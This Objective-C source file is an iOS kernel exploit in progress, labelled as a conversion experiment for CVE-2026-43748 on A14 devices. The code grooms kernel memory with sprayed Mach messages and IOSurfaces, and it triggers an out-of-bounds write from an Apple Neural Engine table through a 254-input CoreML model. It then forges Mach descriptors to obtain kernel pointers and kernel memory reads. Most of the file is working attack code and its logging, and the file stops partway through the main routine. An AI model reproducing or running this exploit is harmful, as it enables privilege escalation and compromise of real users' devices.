//
//  P073AneSecondTable.m
//  P007OpenOnly — CVE-2026-43748 conversion experiment (PATH B).
//
//  Design: Lum1na P044 v46 "second ANE MemoryMap table in the punched-hole
//  LIFO", ported to P007 conventions, plus two passive detectors v46 lacks:
//    D1. IOSurface marker spray — OOB-range addchain inputs (i>=192) are armed
//        with OUR sprayed IOSurface IDs. If the 254 fill smashes table_small
//        and table_small's MemoryMapRequest consumes the forged records, the
//        ANE maps/writes OUR surface -> marker diff = consume signal.
//    D2. Live simple sentinel extras (0x820 kdata) sprayed before+after the
//        hole run, never punched — post-fire recv harvest catches a stray
//        fill when the second-table adjacency missed (FILL HIT oracle).
//
//  Geometry (notes 41/46/51, insn-locked on 23F77):
//    CheckandPrewire 0x874c070: table[i*0x10+0]=surfaceId, +4=symbol,
//    +8=0x100000001. NO cmp #0x80 in the fill. Records 192..253 (n>=0xC1)
//    land in the NEXT kalloc.3072 chunk (first 0x3E0). MemoryMap then
//    restores +0x800..+0x814 and fails count>0x80 with 0xe00002c2 — the
//    254's own MemoryMap consumes nothing. The consumer is table_small.
//
//  Sealed history (do not re-add): fat type-3 OOL neighbor recv is
//  PACGA-fatal (v45, ipc_kmsg.c:460). Punching fat OOL MAFs 16384s in
//  other processes (v42). Type-1 simple extra is payload-only read-back.
//
//  Bar (notes 89/99): conversion=YES is desc_type_forged OR
//  (body_forged AND kptr). Occupancy/FILL HIT alone = NO. hasKread stays
//  NO until commitSlide kread32(kbase)==MH_MAGIC_64.
//
//  Isolation: ONE TAP per force-quit. PANIC POSSIBLE at fire. Per-line
//  POSIX write + F_FULLFSYNC so the log survives the panic.
//

#import "P073AneSecondTable.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <mach/thread_policy.h>
#import <stdarg.h>
#import <string.h>
#import <unistd.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <objc/message.h>

/* v9 (264 Route-A completion): the landing is kernel-attested CONSTANT —
   record index 0xc0 (=192, the OOB-boundary record) at the FREE neighbor
   element's offset 0. No more which-slot randomness. The positioned groom =
   v7j prefill: LIVE PORTKIND kmsgs placed immediately before the fire
   (0 ms interleave + CPU pinning), harvested + decoded AFTER the fire.
   Conversion door bar (174 §5): desc_type_forged OR (body_forged AND kptr).
   The v9 addition is read-side: a fill tail (0x0000000100000001) makes the
   landed desc type u16 = 0x0001 = MACH_MSG_OOL — on receive, the kernel may
   translate that forged desc and hand back a receiver-side OOL buffer whose
   contents come from the address field's target = a kernel-bytes copyout.
   vmread is dlsym local-prototype (no mach_vm.h — AGENTS landmine #2). */
#define P073_BUILD @"p073-second-table-v9-conversion-door"

/* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
#define P073_MSG_SIZE     0x7FCu
#define P073_KDATA_SIZE   (P073_MSG_SIZE + 0x24u)
#define P073_N_HOLES      256u   /* v8: consecutive PORTKIND descs, ALL punched (LIFO) */
#define P073_N_SENT       64u    /* live sentinels before AND after holes */
#define P073_MAGIC        0x50730000u  /* "P073" */
static int  g_p073_inpcbFds[P073_N_HOLES];
static uint32_t g_p073_inpcbN;

/* fire geometry — records 192..253 are OOB (offset >= 0xC00) */
#define P073_INPUTS       254u
#define P073_OOB_FIRST    192u
#define P073_ADDCHAIN     @"XVRC27_254in_1out_addchain"
#define P073_SMALL        @"simple_1in1out"
#define P073_HEADSTART_US 0u   /* v9: 0ms headstart (265 MAF table - landing=deterministic record 192 at off 0) */
#define P073_254_RETRY    3u     /* v3: bounded fill re-fire attempts (v2's 8ms -1
                                    looked like NO-FILL, dirty-ANE suspect: p099
                                    ran 90s before this tap on the same boot) */
/* v7i: the B6 burst fresh tables held PAST the harvest — their chunk frees
   were the MAF freed-lane (5 panic packs 21:55-22:46: the smashed 3072-class
   victim was freed in-window before the D2 recv could measure descForged).
   Retaining until after the sentinel harvest keeps the landings LIVE. */
static NSMutableArray *g_p073_burstHoldersRef;
#define P073_SMALL_BURST  16u    /* v4: burst smalls across the 254 marshal window
                                    (single small dies in ~1ms = empty neighbor) */
#define P073_SMALL_BURST_GAP_US 10000u

/* IOSurface marker spray */
#define P073_N_SURF       48u
#define P073_SURF_MARK    0x53u

/* fill fingerprint (record flags qword) */
#define P073_FILL_FLAG    0x0000000100000001ULL
#define P073_KVA_MIN      0xFFFFFF8000000000ULL
#define P073_KVA_MAX      0xFFFFFFFFFF000000ULL

_Static_assert(P073_KDATA_SIZE == 0x820, "kdata must match ANE table class");

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p073_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p073_iosGetID_t)(IOSurfaceRef);
typedef void *(*p073_iosBase_t)(IOSurfaceRef);
typedef size_t (*p073_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p073_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    mach_port_t port;
    uint32_t    index;
    BOOL        alive;
} p073_held_t;

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p073_surf_t;

static int g_p073_fd = -1;
static NSMutableString *g_p073_buf;

static void p073_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P073AneSecondTable class]) {
        if (g_p073_buf) [g_p073_buf appendString:out];
        if (g_p073_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p073_fd, s, strlen(s));
                fcntl(g_p073_fd, F_FULLFSYNC);   /* panic-surviving flush per line */
            }
        }
    }
}

#pragma mark - IOSurface marker spray (D1)

/* v9: CPU pinning (p088 law) — tag 2 = CPU_B; 254 fire + hole punch share it */
static void p073_pin_cpu_b(void) {
    thread_affinity_policy_data_t ap = { 2 };
    thread_act_t t = pthread_mach_thread_np(pthread_self());
    thread_policy_set(t, THREAD_AFFINITY_POLICY, (thread_policy_t)&ap,
                      THREAD_AFFINITY_POLICY_COUNT);
}

/* v9: fault-safe VM read (dlsym local-prototype shape per P069/P098 — no
   <mach/mach_vm.h> import). Used to read a receiver-side OOL buffer address
   the kernel may have handed back from a forged OOL desc. vm_read returns
   an error kr on unmapped addresses instead of crashing. */
static BOOL p073_vmread(uint64_t addr, uint8_t *out, uint32_t n) {
    typedef kern_return_t (*p073_vmread_t)(mach_port_t, uint64_t, uint64_t,
                                           uint64_t, uint64_t *);
    static p073_vmread_t vr;
    if (!vr) vr = (p073_vmread_t)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
    if (!vr || !out) return NO;
    uint64_t got = 0;   /* mach_vm_size_t* — u64 out-pointer (not type-number) */
    kern_return_t kr = vr(mach_task_self(), addr, (uint64_t)n,
                          (uint64_t)(uintptr_t)out, &got);
    return kr == KERN_SUCCESS && got >= 4;
}

/* v9 OOL-copyout evidence counter (bumped by the harvest) */
static uint32_t g_p073_oolHits;

/* v9: inspect one received descriptor for the OOL conversion door.
   Layout law (v7d, measured): {name u32 @0, pad u32 @4, type u16 @8,
   disp u16 @10}. A fill record {sid u32, flags u32, tail 0x1000000001}
   on a desc => tail lo32 bytes = {type 0x0001, disp 0x0000}, hi32 @12.
   An OOL-classified desc's first 8 bytes = the ADDRESS field (arm64
   64-bit): name | (pad << 32). If the kernel PROCESSED the forged OOL
   desc during our receive (we got MACH_MSG_SUCCESS back with these words),
   the address either points at the original kernel object (ipc_port etc.)
   or the receiver-side copy it made. Read it fault-safely; kernel-range
   patterns or non-0xCC bytes = conversion evidence. */
static void p073_ool_probe(uint32_t idx, uint32_t name, uint32_t padw,
                           uint16_t dtype, uint16_t ddisp) {
    uint64_t addr = (uint64_t)name | ((uint64_t)padw << 32);
    uint8_t buf[32];
    memset(buf, 0xCC, sizeof buf);
    BOOL ok = p073_vmread(addr, buf, sizeof buf);
    if (!ok) {
        p073_log(@"  [v9] OOL forged desc[%u] type=0x%04x disp=0x%04x addr=0x%012llx — "
                 @"not readable from user (desc unprocessed or EFAULT) — honest",
                 idx, dtype, ddisp, addr);
        return;
    }
    BOOL nonzero = NO, kptr = NO;
    for (uint32_t k = 0; k < 8; k++) if (buf[k] != 0xCC) { nonzero = YES; break; }
    for (uint32_t k = 0; k + 8 <= sizeof buf; k += 8) {
        uint64_t q; memcpy(&q, buf + k, 8);
        if (q >= 0xFFFFFE0000000000ULL && q < 0xFFFFFFF000000000ULL) kptr = YES;
    }
    if (nonzero || kptr) {
        g_p073_oolHits++;
        p073_log(@"  [v9] OOL COPYOUT desc[%u] addr=0x%012llx readable=YES "
                 @"nonzero=%d kernelRange=%d bytes:",
                 idx, addr, nonzero, kptr);
        p073_log(@"      %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                 buf[0], buf[1], buf[2], buf[3], buf[4], buf[5], buf[6], buf[7],
                 buf[8], buf[9], buf[10], buf[11], buf[12], buf[13], buf[14], buf[15]);
        p073_log(@"      %02x %02x %02x %02x %02x %02x %02x %02x ...",
                 buf[16], buf[17], buf[18], buf[19], buf[20], buf[21], buf[22], buf[23]);
        if (kptr) {
            [[P007Board shared] recordEvent:@"p073_ool_copyout" kind:@"conversion"
                                     detail:[NSString stringWithFormat:
                                             @"desc=%u addr=0x%012llx kernelRange=YES",
                                             idx, addr]
                                     source:@"p073"];
            p073_log(@"  [v9] kernel-range qwords in the copyout — the OOL kread door bar (body_forged AND kptr) evaluated YES.");
        }
    }
}
static p073_iosCreate_t  s_iosCreate;
static p073_iosGetID_t   s_iosGetID;
static p073_iosBase_t    s_iosBase;
static p073_iosAllocSz_t s_iosAllocSz;
static p073_iosLock_t    s_iosLock;
static p073_iosLock_t    s_iosUnlock;

static BOOL p073_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p073_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p073_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p073_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p073_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p073_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p073_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p073_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p073_surface_create(void) {
    CFNumberRef w = p073_cfnum(64), h = p073_cfnum(64);
    CFNumberRef bpe = p073_cfnum(4), fmt = p073_cfnum(0x42475241); /* BGRA */
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static uint32_t p073_surface_fill_markers(p073_surf_t *arr, uint32_t n) {
    uint32_t ok = 0;
    for (uint32_t i = 0; i < n; i++) {
        IOSurfaceRef s = p073_surface_create();
        if (!s) { p073_log(@"  surf[%u] create FAILED", i); continue; }
        arr[ok].surf = s;
        arr[ok].sid = s_iosGetID(s);
        arr[ok].allocSize = s_iosAllocSz(s);
        void *base = s_iosBase(s);
        if (base && arr[ok].allocSize > 0 && arr[ok].allocSize <= (16UL << 20)) {
            if (s_iosLock(s, 0, NULL) == KERN_SUCCESS) {
                memset(base, P073_SURF_MARK, arr[ok].allocSize);
                s_iosUnlock(s, 0, NULL);
            }
        }
        ok++;
    }
    return ok;
}

/* returns count of surfaces whose bytes differ from the marker */
static uint32_t p073_surface_scan(p073_surf_t *arr, uint32_t n) {
    uint32_t touched = 0;
    for (uint32_t i = 0; i < n; i++) {
        if (!arr[i].surf) continue;
        void *base = s_iosBase(arr[i].surf);
        if (!base) continue;
        size_t sz = arr[i].allocSize;
        if (sz == 0 || sz > (16UL << 20)) continue;
        uint32_t diff = 0;
        uint8_t first[32];
        memset(first, 0, sizeof(first));
        if (s_iosLock(arr[i].surf, 0, NULL) != KERN_SUCCESS) continue;
        const uint8_t *b = (const uint8_t *)base;
        memcpy(first, b, 32);
        for (size_t k = 0; k < sz; k++) {
            if (b[k] != P073_SURF_MARK) { diff++; if (diff >= 64) break; }
        }
        s_iosUnlock(arr[i].surf, 0, NULL);
        if (diff) {
            touched++;
            p073_log(@"  [+] SURFACE TOUCHED sid=%u idx=%u diff>=%u first32 %02x %02x %02x %02x %02x %02x %02x %02x",
                     arr[i].sid, i, diff,
                     first[0], first[1], first[2], first[3],
                     first[4], first[5], first[6], first[7]);
            p073_log(@"      first32(cont) %02x %02x %02x %02x %02x %02x %02x %02x ...",
                     first[8], first[9], first[10], first[11],
                     first[12], first[13], first[14], first[15]);
            [[P007Board shared] recordEvent:@"p073_surface_touched"
                                       kind:@"consume"
                                     detail:[NSString stringWithFormat:@"sid=%u idx=%u diff>=%u",
                                             arr[i].sid, i, diff]
                                     source:@"p073"];
        }
    }
    return touched;
}

#pragma mark - kmsg spray (P034 contract)

static mach_port_t p073_make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS)
        return MACH_PORT_NULL;
    if (mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
        mach_port_deallocate(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    return port;
}

static BOOL p073_send_simple(mach_port_t port, uint32_t index) {
    uint8_t buf[P073_MSG_SIZE];
    memset(buf, 0xA5, sizeof(buf));
    uint8_t *body = buf + sizeof(mach_msg_header_t);
    memcpy(body, "P073", 4);
    uint32_t tag = index ^ P073_MAGIC;
    memcpy(body + 4, &tag, 4);
    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    h->msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    h->msgh_size        = P073_MSG_SIZE;
    h->msgh_remote_port = port;
    h->msgh_local_port  = MACH_PORT_NULL;
    h->msgh_id          = (int)(P073_MAGIC | (int)(index & 0xFFFFu));
    return mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) == MACH_MSG_SUCCESS;
}

/* v7 port-kind band geometry (P044 v49 shape, note 181): a COMPLEX kmsg at
   msgh_size 0x7FC (kdata=0x820, P034 contract) carrying N_PORT port
   descriptors. All sentPost victims use this shape because two v5/v6 boots
   (22:39, 22:59) proved the 254 fill DETERMINISTICALLY lands its first OOB
   records (192..195, flags 0xc0..0xc3) at the chunk adjacent to the sentPost
   band, i.e. body+0..0x40 — exactly the desc region (body+0x04..0x64). The
   spilled record bytes = forged descriptor dispositions/types in kernel
   memory; the recv-side processing of those descs is the conversion door. */
/* v7g: 16 descs. The OOB record stream lands at victim body+0x64 (21:44/22:09
   law: an 8-desc port-kind kmsg ends its desc block exactly at 0x64 =
   0x20 hdr + 4 body + 8x12 descs — the landing starts AT the boundary, zero
   overlay, descForged=0 by arithmetic). 16 descs extend the block to 0xC4:
   records landing 0x64..0xC4 overwrite descs 6..15 incl. their {type@8,
   disposition@10} words = the v49 desc door. */
#define P073_N_DESC (16u)
#define P073_PORT_BODY_OFF (sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t))

static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
    uint8_t buf[P073_MSG_SIZE];
    memset(buf, 0xA5, sizeof(buf));
    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    mach_msg_body_t *b = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    b->msgh_descriptor_count = P073_N_DESC;
    /* v7c fix (diffed against P044's proven port_msg shape): the descriptor
       type field must be MACH_MSG_PORT_DESCRIPTOR (0) — MACH_MSG_TYPE_PORT_NAME
       (15) is the legacy MIG constant and the modern kernel descriptor
       validator rejects it (tonight's mr=0x1000000f INVALID_TRAILER x64) —
       and each desc carries a FRESH port right (own refs, released post-send
       like p044) instead of a COPY_SEND of the dest port itself. */
    mach_port_t dp[P073_N_DESC];
    for (uint32_t i = 0; i < P073_N_DESC; i++) {
        mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)
            (buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + i * sizeof(mach_msg_port_descriptor_t));
        dp[i] = p073_make_port();
        d->name        = dp[i];
        d->disposition = MACH_MSG_TYPE_COPY_SEND;
        d->type        = MACH_MSG_PORT_DESCRIPTOR;
    }
    uint8_t *payload = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)
                     + P073_N_DESC * sizeof(mach_msg_port_descriptor_t);
    memcpy(payload, "P073P", 5);
    uint32_t tag = index ^ P073_MAGIC;
    memcpy(payload + 8, &tag, 4);
    h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    h->msgh_size = P073_MSG_SIZE;
    h->msgh_remote_port = port;
    h->msgh_local_port = MACH_PORT_NULL;
    h->msgh_id = (int)(P073_MAGIC | (int)(index & 0xFFFFu));
    mach_msg_return_t mr = mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    /* the send consumed the desc rights (COPY_SEND); release caller copies */
    for (uint32_t i = 0; i < P073_N_DESC; i++) {
        if (dp[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), dp[i]);
    }
    if (mr != MACH_MSG_SUCCESS) {
        p073_log(@"  [!] portkind send idx=%u mr=0x%x (%s) — complex shape rejected",
                 index, mr,
                 mr == 0x1000000f ? "SEND_INVALID_TRAILER" :
                 mr == 0x1000000d ? "SEND_INVALID_HEADER" : "other");
        return NO;
    }
    return YES;
}

/* recv one port-kind victim; -1 = processed with evidence (smash seen),
    0 = gone/timeout, 1 = clean */
static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
    uint8_t rbuf[P073_MSG_SIZE + 0x300];
    memset(rbuf, 0, sizeof(rbuf));
    mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
    mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                    (mach_msg_size_t)sizeof(rbuf), v->port, 0, MACH_PORT_NULL);
    if (mr == MACH_RCV_TIMED_OUT) return 0;
    if (mr != MACH_MSG_SUCCESS) {
        /* kernel choked on the received complex message — if this victim was
           fill-adjacent, the smashed descriptor region is the witness. */
        p073_log(@"  [!] PORTKIND sentPost[%u] recv mr=0x%x (desc processing rejected/errored)",
                 v->index, mr);
        p073_log(@"      head bytes at +%018zx: (hexdump below)", P073_PORT_BODY_OFF);
        uint8_t *rb = (uint8_t *)h;
        for (uint32_t row = 0; row < 6; row++) {
            char hx[16 * 3 + 1]; hx[0] = 0;
            for (uint32_t k = 0; k < 16; k++)
                snprintf(hx + k * 3, 4, "%02x ", rb[row * 16 + k]);
            p073_log(@"      +%03x %s", row * 16, [NSString stringWithUTF8String:hx]);
        }
        [[P007Board shared] recordEvent:@"p073_portkind_reject"
                                 kind:@"desc_reject"
                               detail:[NSString stringWithFormat:@"idx=%u mr=0x%x", v->index, mr]
                               source:@"p073"];
        if (descForgeOut) (*descForgeOut)++;
        return -1;
    }
    if (!(h->msgh_bits & MACH_MSGH_BITS_COMPLEX)) return 1;
    uint32_t cnt = ((mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t)))->msgh_descriptor_count;
    uint32_t forge = 0;
    for (uint32_t i = 0; i < cnt && i < 16; i++) {
        uint8_t *dp = rbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)
                    + i * sizeof(mach_msg_port_descriptor_t);
        /* v7d layout, measured on the 00:26 run: {name u32 @0, pad u32 @4,
           u16 type @8 (0 = PORT_DESCRIPTOR), u16 disp @10 (0x11 = COPY_SEND)}.
           A fill record {sid u32, flags u32, tail 0x1000000001} landing on a
           desc reads name=sid, pad=flags, type u16 = tail lo, disp u16 = tail
           hi-half = 1 != 0x11 -> DETECTABLE. The v7c 4-byte reads at +4/+10
           misflagged every clean desc (the 0x11 byte lives INSIDE the +8 u32).
           */
        uint32_t name, padw;
        uint16_t dtype, ddisp;
        memcpy(&name, dp + 0, 4);
        memcpy(&padw, dp + 4, 4);
        memcpy(&dtype, dp + 8, 2);
        memcpy(&ddisp, dp + 10, 2);
        /* v7e: compare against LITERAL recv values — the rig SDK's
           MACH_MSG_PORT_DESCRIPTOR / MACH_MSG_TYPE_COPY_SEND constants don't
           match the kernel's written-back words (v7d flagged every clean
           {type=0, disp=0x11} desc, contradicting the SDK constants).
           Clean port desc = {type u16 == 0, disp u16 == 0x11}. A fill record
           {sid u32, flags u32, tail 0x1000000001} on a desc reads disp u16
           = 0x0001 != 0x11 -> detectable. */
        BOOL sm = (ddisp != 0x11u) || (dtype != 0u)
               || (name >= P073_KVA_MIN && name < P073_KVA_MAX);
        if (sm) {
            forge++;
            p073_log(@"  [+] DESC SMASHED sentPost[%u] desc[%u] name=0x%08x pad=0x%08x "
                     @"type=0x%04x disp=0x%04x (fill record: sid=%u flags=0x%08x tail=0x%04x%04x)",
                     v->index, i, name, padw, dtype, ddisp,
                     name, padw, ddisp, dtype);
            /* v9: a fill-tail (0x1000000001) class landing = type 0x0001 = OOL —
               the conversion door read. Probe the address the kernel may have
               translated (legal portdesc recv path — NOT the sealed fat-3). */
            if (dtype == 0x0001u)
                p073_ool_probe(i, name, padw, dtype, ddisp);
        }
    }
    if (forge) {
        [[P007Board shared] recordEvent:@"p073_desc_forged" kind:@"desc_type_forged"
                                 detail:[NSString stringWithFormat:@"idx=%u forged=%u", v->index, forge]
                                 source:@"p073"];
        if (descForgeOut) (*descForgeOut)++;
        return -1;
    }
    return 1;
}

/* recv one simple extra; 1 = clean marker, 0 = gone/timeout, -1 = MUTATED */
static int p073_harvest_one(p073_held_t *v, const char *label) {
    uint8_t rbuf[P073_MSG_SIZE + 64];
    memset(rbuf, 0, sizeof(rbuf));
    mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
    mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                    (mach_msg_size_t)sizeof(rbuf), v->port, 0, MACH_PORT_NULL);
    if (mr == MACH_RCV_TIMED_OUT) return 0;
    if (mr != MACH_MSG_SUCCESS) {
        p073_log(@"  [*] %s[%u] recv mr=0x%x (gone)", label, v->index, mr);
        return 0;
    }
    uint8_t *body = rbuf + sizeof(mach_msg_header_t);
    uint32_t expect = v->index ^ P073_MAGIC;
    BOOL markerOK = (memcmp(body, "P073", 4) == 0 && memcmp(body + 4, &expect, 4) == 0);
    uint64_t *q = (uint64_t *)body;
    uint32_t nq = (P073_MSG_SIZE - (uint32_t)sizeof(mach_msg_header_t)) / 8;
    uint32_t fillHits = 0, kptrs = 0;
    long long firstFlag = -1;
    for (uint32_t w = 0; w < nq; w++) {
        if (q[w] == P073_FILL_FLAG) {
            fillHits++;
            if (firstFlag < 0) firstFlag = w * 8;
        }
        if (q[w] >= P073_KVA_MIN && q[w] < P073_KVA_MAX) {
            kptrs++;
            [[P007Board shared] recordCandidate:q[w]
                                           kind:(((q[w] >> 32) == 0xFFFFFFF0ULL) ? @"text_ptr" : @"heap_ptr")
                                         source:@"p073_harvest"];
        }
    }
    if (!markerOK || fillHits) {
        p073_log(@"  [+] FILL HIT %s[%u] idx=%u markerOK=%d fillFlags=%u firstFlagOff=%lld kptrs=%u",
                 label, v->index, v->index, markerOK, fillHits, firstFlag, kptrs);
        /* dump first 4 smashed records so the input->record mapping is measurable */
        for (uint32_t r = 0; r < 4; r++) {
            uint32_t sid = 0, sym = 0; uint64_t flg = 0;
            memcpy(&sid, body + r * 0x10 + 0, 4);
            memcpy(&sym, body + r * 0x10 + 4, 4);
            memcpy(&flg, body + r * 0x10 + 8, 8);
            p073_log(@"      record[%u] surfaceId=0x%08x symbol=0x%08x flags=0x%016llx",
                     r, sid, sym, flg);
        }
        [[P007Board shared] recordEvent:@"p073_fill_hit"
                                   kind:@"occupancy"
                                 detail:[NSString stringWithFormat:@"%s[%u] fillFlags=%u kptrs=%u",
                                         label, v->index, fillHits, kptrs]
                                 source:@"p073"];
        return -1;
    }
    return 1;
}

#pragma mark - CoreML

static NSURL *p073_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    u = [b URLForResource:name withExtension:@"mlpackage"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlmodel"];
}

@implementation P073AneSecondTable

+ (NSString *)tap {
    g_p073_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p073_ane_second_table_log.txt"];
    g_p073_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p073_log(@"=== p073 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P073_BUILD);
    p073_log(@"43748 conversion: second ANE MemoryMap table as the 3072 neighbor (v46 parity).");
    p073_log(@"Bar: conversion=YES is desc_type_forged OR (body_forged AND kptr). Occupancy != conversion.");
    p073_log(@"No fat type-3 (v45 PACGA). No fat punch (v42 16384 MAF). One TAP per force-quit.");
    p073_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p073"];
    if (stop) {
        p073_log(@"%@", stop);
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }
    p073_log(@"%@", [LabDeviceProfile identBlock]);
    p073_log(@"%@", [LabDeviceProfile huntTapWarn:@"p073"] ?: @"");
    [LabDeviceProfile stampLastTap:@"p073"];

    {
        const LabOffTab *off = LabOff();
        if (off && off->ane_fill_cap) {
            p073_log(@"EXPECT-BAD fill_cap=1. 254-in CheckandPrewire on this SKU -> 0xe00002c2. Probe still fires.");
        } else if (off && off->ane_table_size && off->ane_table_size != 0x820u) {
            p073_log(@"EXPECT-BAD ane_table_size=0x%x (T8150 0x10b8 class, not A14 0x820). Probe still fires.",
                     off->ane_table_size);
        } else if (!off) {
            p073_log(@"EXPECT-BAD LabOff NULL. Probe still fires.");
        }
    }

    /* ---- anchor (informational; aio84530 heap leak recorded by P063) ---- */
    uint64_t anchor = 0;
    for (NSDictionary *e in [[P007Board shared].leaks reverseObjectEnumerator]) {
        if (![e isKindOfClass:[NSDictionary class]]) continue;
        NSString *src = [e[@"source"] isKindOfClass:[NSString class]] ? e[@"source"] : @"";
        if (![src isEqualToString:@"aio84530"]) continue;
        anchor = strtoull([[e[@"va"] description] UTF8String] ?: "0x0", NULL, 16);
        if (anchor) break;
    }
    p073_log(@"anchor=%@ (heap leak; informational only — NOT armed this build)",
             anchor ? [NSString stringWithFormat:@"0x%016llx", anchor] : @"NONE");

    /* ---- D1: IOSurface marker spray FIRST (keeps 3072 band clean) ---- */
    p073_surf_t *surfs = calloc(P073_N_SURF, sizeof(p073_surf_t));
    uint32_t nSurf = 0;
    if (p073_resolve_iosurface()) {
        nSurf = p073_surface_fill_markers(surfs, P073_N_SURF);
    }
    p073_log(@"[D1] IOSurface markers: %u/%u created, filled 0x%02x", nSurf, P073_N_SURF, P073_SURF_MARK);
    if (nSurf == 0) {
        p073_log(@"[-] no surfaces — D1 disarmed, continuing with D2 only");
    } else {
        NSMutableString *idline = [NSMutableString stringWithString:@"  sids:"];
        for (uint32_t i = 0; i < nSurf && i < 16; i++)
            [idline appendFormat:@" %u", surfs[i].sid];
        if (nSurf > 16) [idline appendFormat:@" ... (%u total)", nSurf];
        p073_log(@"%@", idline);
    }

    /* ---- models ---- */
    NSURL *url254 = p073_model_url(P073_ADDCHAIN);
    NSURL *urlSmall = p073_model_url(P073_SMALL);
    if (!url254 || !urlSmall) {
        p073_log(@"[-] model missing: addchain=%@ small=%@", url254 ? @"ok" : @"MISSING",
                 urlSmall ? @"ok" : @"MISSING");
        p073_log(@"=== VERDICT === abort (no model). hasKread=NO.");
        for (uint32_t i = 0; i < nSurf; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p073_fd >= 0) { fcntl(g_p073_fd, F_FULLFSYNC); close(g_p073_fd); g_p073_fd = -1; }
        NSString *ret = g_p073_buf; g_p073_buf = nil; return ret;
    }
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = MLComputeUnitsAll;
    NSError *err = nil;
